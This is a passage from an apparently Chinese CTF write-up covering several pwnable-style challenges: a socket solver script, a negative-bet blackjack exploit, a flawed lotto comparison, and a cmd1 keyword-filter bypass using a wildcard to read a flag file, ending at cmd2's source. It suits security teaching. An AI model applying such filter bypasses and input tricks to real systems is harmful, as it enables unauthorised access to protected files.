</span></span><span class=line><span class=cl>	<span class=n>C</span> <span class=o>=</span> <span class=n>ret</span><span class=p>[</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;C=&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>2</span><span class=p>:</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>	<span class=n>low</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>	<span class=n>high</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>C</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>		<span class=n>cnt</span> <span class=o>=</span> <span class=p>(</span><span class=n>high</span><span class=o>-</span><span class=n>low</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>		<span class=n>mid</span> <span class=o>=</span> <span class=n>low</span> <span class=o>+</span> <span class=n>cnt</span>
</span></span><span class=line><span class=cl>		<span class=n>query</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>low</span><span class=p>,</span> <span class=n>mid</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>		<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>query</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>ret</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>%</span> <span class=mi>10</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=n>low</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=n>high</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>low</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=blackjack>blackjack</h2><p>这题要求玩 21 点玩到拥有 <code>$1,000,000</code>，显然不能通过常规方法达成。我们查看题目给的源码，发现下注时使用的变量 <code>bet</code> 是一个 <code>int</code> 类型的数。</p><p>随后，<code>betting</code> 函数是这样的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>betting</span><span class=p>()</span> <span class=c1>//Asks user amount to bet
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>Enter Bet: $&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>bet</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=k>if</span> <span class=p>(</span><span class=n>bet</span><span class=o>&gt;</span> <span class=n>cash</span><span class=p>)</span> <span class=c1>//If player tries to bet more money than player has
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>You cannot bet more money than you have.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Enter Bet:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>bet</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>bet</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=k>else</span> <span class=k>return</span> <span class=n>bet</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=c1>// End Function
</span></span></span></code></pre></td></tr></table></div></div><p>这里程序检查了下的注是否大于拥有的现金数，但并没有检查是否为负数。而当我们输掉一盘后：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>player_total</span><span class=o>&lt;</span><span class=n>dealer_total</span><span class=p>)</span> <span class=c1>//If player&#39;s total is less than dealer&#39;s total, loss
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Dealer Has the Better Hand. You Lose.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>loss</span> <span class=o>=</span> <span class=n>loss</span><span class=o>+</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>cash</span> <span class=o>=</span> <span class=n>cash</span> <span class=o>-</span> <span class=n>bet</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>You have %d Wins and %d Losses. Awesome!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>won</span><span class=p>,</span> <span class=n>loss</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>dealer_total</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>askover</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到这里有一个 <code>cash = cash - bet</code> 的语句，当我们输入的 <code>bet</code> 是负数时，我们就可以让钱不减反增。也就是说，我们只需要下注 <code>-1000000</code>，然后故意输掉即可。</p><h2 id=lotto>lotto</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>submit</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>play</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Submit your 6 lotto bytes :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>submit</span><span class=p>,</span> <span class=mi>6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Lotto Start!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>//sleep(1);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>// generate lotto numbers
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>fd</span><span class=o>==-</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;error. tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>lotto</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>lotto</span><span class=p>,</span> <span class=mi>6</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>6</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;error2. tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>%</span> <span class=mi>45</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>		<span class=c1>// 1 ~ 45
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// calculate lotto score
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>int</span> <span class=n>match</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>for</span><span class=p>(</span><span class=n>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>j</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>j</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>				<span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// win!
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=n>match</span> <span class=o>==</span> <span class=mi>6</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;bad luck...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>help</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;- nLotto Rule -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;nlotto is consisted with 6 random natural numbers less than 46</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;your goal is to match lotto numbers as many as you can</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;if you win lottery for *1st place*, you will get reward</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;for more details, follow the link below</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;mathematical chance to win this game is known to be 1/8145060.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// menu
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>menu</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;- Select Menu -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;1. Play Lotto</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;2. Help</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;3. Exit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>menu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=k>switch</span><span class=p>(</span><span class=n>menu</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=n>play</span><span class=p>();</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=n>help</span><span class=p>();</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=n>printf</span><span class=p>(</span><span class=s>&#34;bye</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=n>printf</span><span class=p>(</span><span class=s>&#34;invalid menu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>很简单的彩票程序，利用伪随机数生成 6 个 <code>1 - 45</code> 之间的彩票号码，然后跟输入比对，如果全中则显示 flag。这个程序如此简单以至于其中的一个细节很容易被忽略：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// calculate lotto score
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=n>match</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span><span class=p>(</span><span class=n>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>j</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>j</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>			<span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这是比对彩票号码的代码，初看之下没什么问题，但是如果让我们自己来写，正常的写法肯定是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>但这里却用了两层循环，并不是像我们想的那样比较对应位，而是从 <code>lotto</code> 和 <code>submit</code> 中各自任取一位，进行共 36 次比较。而对 <code>match</code> 的要求是 6，也就是说 36 次比较中有 6 次正确即可。</p><p>为了让成功的机率最大，我们可以输入 6 个相同的数字 <code>x</code>，只要在 <code>lotto</code> 中有一个号码等于 <code>x</code>，那么我们就成功了，这个概率还是比较大的。</p><p>需要注意的是输入的字节范围是从 <code>\x01</code> 到 <code>\x45</code>（<code>-</code>），而不是数字 <code>1-45</code>。</p><h2 id=cmd1>cmd1</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>filter</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>r</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;flag&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;sh&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;tmp&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>**</span> <span class=n>envp</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=n>putenv</span><span class=p>(</span><span class=s>&#34;PATH=/thankyouverymuch&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>filter</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>需要一个命令行参数，但参数中不能包含 <code>flag</code>，<code>sh</code> 和 <code>tmp</code>，这个我们可以利用通配符绕过。注意到环境变量 <code>PATH</code> 被覆盖，因此我们调用命令时需要使用绝对路径。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./cmd1 <span class=s2>&#34;/bin/cat /home/cmd1/fla*&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=cmd2>cmd2</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
